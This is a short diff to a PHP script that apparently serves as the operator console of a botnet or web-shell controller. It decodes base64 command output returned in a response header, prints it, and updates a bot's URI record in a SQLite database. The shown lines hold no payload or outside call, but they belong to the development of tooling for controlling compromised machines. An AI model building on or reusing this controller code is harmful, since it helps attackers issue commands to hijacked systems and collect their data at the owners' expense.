@@ -146,8 +146,12 @@ while (true) {
                 break;
             }
             if (!is_null($command->getHeaderLine('D'))){
-                echo sprintf("Command completed!\n\n\033[0;35m%s\033[0m\n\n", base64_decode($command->getHeaderLine("D"))).PHP_EOL;
-                database->slopSqlite(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => $command->getHeaderLine('NewName')]);
+                foreach (explode(":", base64_decode($command->getHeaderLine("D"))) as $output){
+                    echo sprintf("\033[0;35m%s\033[0m", str_replace(";", "\n", trim($output))).PHP_EOL;
+                }
+                if ($command->getHeaderLine('NewName') !== "") {
+                    database->slopSqlite(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => sprintf("/%s", $command->getHeaderLine('NewName'))]);
+                }
             }else{
                 echo "Command failed successfully.....".PHP_EOL;
             }
